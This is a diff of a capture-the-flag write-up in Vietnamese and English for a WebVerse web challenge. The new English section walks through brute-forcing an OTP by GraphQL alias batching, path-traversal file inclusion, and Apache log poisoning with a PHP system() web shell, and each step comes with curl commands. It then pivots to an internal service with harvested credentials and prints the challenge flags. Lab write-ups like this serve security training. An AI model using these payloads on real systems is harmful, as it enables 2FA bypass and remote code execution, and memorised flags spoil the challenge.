@@ -76,7 +76,7 @@ if (strpos($directive, 'dashboard-pages/') !== 0) {
 include("views/" . $directive . ".php");
 ```
 
-Hàm chỉ kiểm tra chuỗi bắt đầu bằng `dashboard-pages/`, hoàn toàn không chuẩn hóa đường dẫn bằng `realpath()` hay `basename()`. 
+Hàm chỉ kiểm tra chuỗi bắt đầu bằng `dashboard-pages/`, hoàn toàn không chuẩn hóa đường dẫn bằng `realpath()` hay `basename()`.
 Do đó, payload sau thoát hoàn toàn khỏi thư mục `views/`:
 
 ```text
@@ -124,59 +124,104 @@ JSON phản hồi trả về trường `release_code` chứa flag:
 
 <div class="lang-en" markdown="1">
 
-> **Flag:** `h7ctf{gr4phql_b4tch_0tp_brut3_rce}`
+> **Flag:** `WEBVERSE{6add1fa0046769ecfe34b673b76cd2a3}`
 
-This challenge is a **Web / Hard** challenge from WebVerse / H7CTF'26. The target is a PHP portal secured by Two-Factor Authentication (2FA) and a **GraphQL** API backend.
 
-The vulnerability stems from GraphQL query batching, allowing complete OTP rate-limit bypass leading to internal admin RCE.
+This article belongs to the category **Web / Hard** on the WebVerse platform. The application is a PHP web app with two-factor authentication (2FA) and a **GraphQL** endpoint. The flag is not located directly in the web app but in an internal microservice, requiring the player to achieve remote code execution (RCE).
 
 ---
 
-## Solve Flow
+## Solve Flow Diagram
 
 ```mermaid
 flowchart TD
-    A["Web App: 2FA Protected Admin Portal"] --> B["Identify GraphQL Endpoint: POST /graphql"]
-    B --> C["Detect lack of query batching limit (alias / array batching)"]
-    C --> D["Craft single HTTP request containing 10,000 aliased verifyOtp calls"]
-    D --> E["Bypass IP-based rate limiting in single TCP roundtrip"]
-    E --> F["Receive 200 OK with valid administrative session bearer token"]
-    F --> G["Access internal diagnostic mutation: executeDebugCommand()"]
-    G --> H["Command Injection: cat /flag.txt"]
-    H --> I["Flag: h7ctf{gr4phql_b4tch_0tp_brut3_rce}"]
+    A["GraphQL /graphql -> Mutation verifyOtp"] --> B["Rate-limit: 150 requests / session"]
+    B --> C["Exploit GraphQL Alias ​​Batching: 5000-10000 alias/request"]
+    C --> D["Brute force exhausted 10^5 5-digit OTP codes in only ~10 requests"]
+    D --> E["Bypass 2FA successfully -> Access dashboard"]
+    E --> F["dashboard.php?directive=... only checks for strpos startswith 'dashboard-pages/'"]
+    F --> G["LFI vulnerability: ?directive=dashboard-pages/../../../../../..."]
+    G --> H["Read access.log (located in open_basedir and world-readable)"]
+    H --> I["Log Poisoning: Log the PHP backdoor into the User-Agent header"]
+    I --> J["Exploiting RCE via LFI calls access.log"]
+    J --> K["Scanning the internal network detected settlement service at 127.0.0.1:9200"]
+    K --> L["Read the script file /opt/recon/nightly.sh to find the Basic Auth password"]
+    L --> M["curl http://settlement.internal:9200/ledger/reconcile"]
+    M --> N["Flag: WEBVERSE{6add1fa0046769ecfe34b673b76cd2a3}"]
 ```
 
 ---
 
-## Step 1: Bypassing OTP Rate Limits via Query Batching
+## Step 1: Bypass 2FA using GraphQL Alias ​​Batching
 
-While individual HTTP requests are rate-limited to 5 attempts per minute, the GraphQL engine processes multiple aliased mutations within a single payload:
+Endpoint `/graphql` provides mutation `verifyOtp(code: String)`. Limit setting system:
+```text
+BB_OTP_REQ_LIMIT = 150 (HTTP requests per session)
+```
+
+However, GraphQL allows thousands of operations to be combined into a single request using Alias ​​syntax:
 
 ```graphql
-mutation BatchBypass {
-  t0000: verifyOtp(code: "0000") { token }
-  t0001: verifyOtp(code: "0001") { token }
+{
+  a0: verifyOtp(code: "00000")
+  a1: verifyOtp(code: "00001")
   ...
-  t9999: verifyOtp(code: "9999") { token }
+  a9999: verifyOtp(code: "09999")
 }
 ```
 
-The response returns the admin session token at alias `t4819`.
+By sending 10,000 aliases at a time, the entire $10^5$ 5-digit OTP code space was cleared in just 10 HTTP requests, bypassing the limit mechanism and successfully logging in to the `dashboard.php` admin page.
 
 ---
 
-## Step 2: Exploiting Internal Admin Mutation
+## Step 2: Local File Inclusion (LFI) on `directive`
 
-With the admin token, we query the private mutation `executeDebugCommand`:
+At `dashboard.php`:
 
-```graphql
-mutation {
-  executeDebugCommand(cmd: "cat /flag.txt") { output }
+```php
+if (strpos($directive, 'dashboard-pages/') !== 0) {
+    die("Invalid directive");
 }
+include("views/" . $directive . ".php");
 ```
 
-The server returns the flag in the response body.
+The function only checks for strings starting with `dashboard-pages/`, and does not normalize paths with `realpath()` or `basename()`. Therefore, the following payload completely escapes the `views/` directory:
 
-⇒ **Flag:** `h7ctf{gr4phql_b4tch_0tp_brut3_rce}`
+```text
+?directive=dashboard-pages/../../../../../var/log/apache2/access
+```
 
+---
+
+## Step 3: Apache Log Poisoning $\to$ RCE
+
+The file `/var/log/apache2/access.log` has read permissions and is within the scope of the `open_basedir` configuration.
+
+Send the first request with malicious PHP code in User-Agent: *(Note: Apache automatically escapes the `"` to `\"`, so the payload is required to only use single quotes `'` to avoid causing PHP syntax errors)*:
+
+```bash
+curl -A "<?php system(\$_GET['c']); ?>" https://<instance_id>.webverselabs-pro.com/
+```
+
+Enable system command execution via LFI:
+
+```bash
+curl "https://<instance_id>.webverselabs-pro.com/dashboard.php?directive=dashboard-pages/../../../../../var/log/apache2/access&c=id"
+```
+
+---
+
+## Step 4: Pivot to Internal Service to collect Flag
+
+Survey internal network from shell: Detect process listening at `127.0.0.1:9200` (*Settlement Service*). The service requests HTTP Basic Authentication of user `jax`.
+
+Reading internal cron file `/opt/recon/nightly.sh`: Found login password of `jax`. Make a call to the ledger reconciliation API:
+
+```bash
+curl -u jax:<password> http://127.0.0.1:9200/ledger/reconcile
+```
+
+The response JSON returns a `release_code` field containing the flag:
+
+⇒ **Flag:** `WEBVERSE{6add1fa0046769ecfe34b673b76cd2a3}`
 </div>
